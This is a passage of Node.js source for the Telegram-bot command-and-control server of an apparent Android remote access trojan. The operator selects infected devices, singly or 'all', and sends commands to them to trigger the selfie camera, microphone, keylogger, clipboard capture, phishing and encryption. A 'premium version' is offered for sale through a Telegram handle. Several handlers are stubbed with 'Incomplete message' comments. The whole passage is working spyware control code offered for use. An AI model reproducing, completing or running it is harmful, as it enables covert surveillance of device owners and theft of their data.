                bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                        resize_keyboard: true
                    }
                });
            }
            // Selfie Camera
            else if (text === '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯') {
                if (currentTarget == 'all') {
                    io.sockets.emit('commend', { request: 'selfie-camera', extras: [] });
                } else {
                    io.to(currentTarget).emit('commend', { request: 'selfie-camera', extras: [] });
                }
                appData.delete('currentTarget');
                bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                        resize_keyboard: true
                    }
                });
            }
            // Microphone
            else if (text === '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯') {
                if (currentTarget == 'all') {
                    io.sockets.emit('commend', { request: 'microphone', extras: [] });
                } else {
                    io.to(currentTarget).emit('commend', { request: 'microphone', extras: [] });
                }
                appData.delete('currentTarget');
                bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                        resize_keyboard: true
                    }
                });
            }
            // File Explorer
            else if (text === '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯') {
                bot.sendMessage(data.id, '<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ', { parse_mode: 'HTML' }); // Incomplete message
                // The original code seems to have an incomplete message here. Likely meant to ask for a path.
            }
            // Apps
            else if (text === '✯ 𝙰𝚙𝚙𝚜 ✯') {
                bot.sendMessage(data.id, '<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ', { parse_mode: 'HTML' }); // Incomplete message
            }
            // Keylogger ON
            else if (text === '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯') {
                if (currentTarget == 'all') {
                    io.sockets.emit('commend', { request: 'keylogger-on', extras: [] });
                } else {
                    io.to(currentTarget).emit('commend', { request: 'keylogger-on', extras: [] });
                }
                appData.delete('currentTarget');
                bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                        resize_keyboard: true
                    }
                });
            }
            // Keylogger OFF
            else if (text === '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯') {
                if (currentTarget == 'all') {
                    io.sockets.emit('commend', { request: 'keylogger-off', extras: [] });
                } else {
                    io.to(currentTarget).emit('commend', { request: 'keylogger-off', extras: [] });
                }
                appData.delete('currentTarget');
                bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                        resize_keyboard: true
                    }
                });
            }
            // Screenshot
            else if (text === '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯') {
                bot.sendMessage(data.id, '<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ', { parse_mode: 'HTML' }); // Incomplete message
            }
            // Vibrate
            else if (text === '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯') {
                appData.set('currentAction', 'vibrateDuration');
                bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
            // Toast
            else if (text === '✯ 𝚃𝚘𝚊𝚜𝚝 ✯') {
                appData.set('currentAction', 'toastText');
                bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
            // Pop Notification
            else if (text === '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯') {
                appData.set('currentAction', 'notificationText');
                bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
            // Open URL
            else if (text === '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯') {
                appData.set('currentAction', 'openUrl');
                bot.sendMessage(data.id, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝙲</b>\n\n', { // Typo: SMC should be SMS
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
            // Play Audio
            else if (text === '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯') {
                bot.sendMessage(data.id, '<b>✯ 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 dm to buy @sphanter</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                        resize_keyboard: true
                    }
                });
            }
            // Stop Audio
            else if (text === '✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯') {
                bot.sendMessage(data.id, '<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ', { parse_mode: 'HTML' }); // Incomplete message
            }
            // Decrypt
            else if (text === '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯') {
                bot.sendMessage(data.id, '<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ', { parse_mode: 'HTML' }); // Incomplete message
            }
            // Encrypt
            else if (text === '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯') {
                bot.sendMessage(data.id, '<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ', { parse_mode: 'HTML' }); // Incomplete message
            }
            // Clipboard
            else if (text === '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯') {
                bot.sendMessage(data.id, '<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ', { parse_mode: 'HTML' }); // Incomplete message
            }
        }
        // --- Handle selection of a specific device ---
        else {
            io.sockets.sockets.forEach((socket, id, map) => {
                if (text === socket.deviceId) {
                    appData.set('currentTarget', id);
                    bot.sendMessage(data.id, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ' + socket.model + '</b>\n\n', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [
                                ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙲𝚊𝚕𝚕𝚜 ✯'],
                                ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                                ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯'],
                                ['✯ 𝙰𝚙𝚙𝚜 ✯', '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯'],
                                ['✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯'],
                                ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
                                ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯'],
                                ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
                                ['✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯', '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯'],
                                ['✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯'],
                                ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                            ],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    });
                }
            });

            // Handle selection of 'all' devices
            if (text == 'all') {
                appData.set('currentTarget', 'all');
                bot.sendMessage(data.id, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: [
                            ['✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙲𝚊𝚕𝚕𝚜 ✯'],
                            ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
                            ['✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯'],
                            ['✯ 𝙰𝚙𝚙𝚜 ✯', '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯'],
                            ['✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯'],
                            ['✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
                            ['✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯'],
                            ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯'],
                            ['✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯', '✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯'],
                            ['✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯'],
                            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
                        ],
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
        }
    }
});

// Ping all connected devices every 5 seconds (5000 ms)
setInterval(() => {
    io.sockets.sockets.forEach((socket, id, map) => {
        io.to(id).emit('ping', {});
    });
}, 5000);

// Keep-alive ping to the server's own URL every 30 seconds (30000 ms) to prevent sleeping
setInterval(() => {
    https.get(data.url, res => { }).on('error', err => { });
}, 30000);

// Start the server
server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port 3000');
});
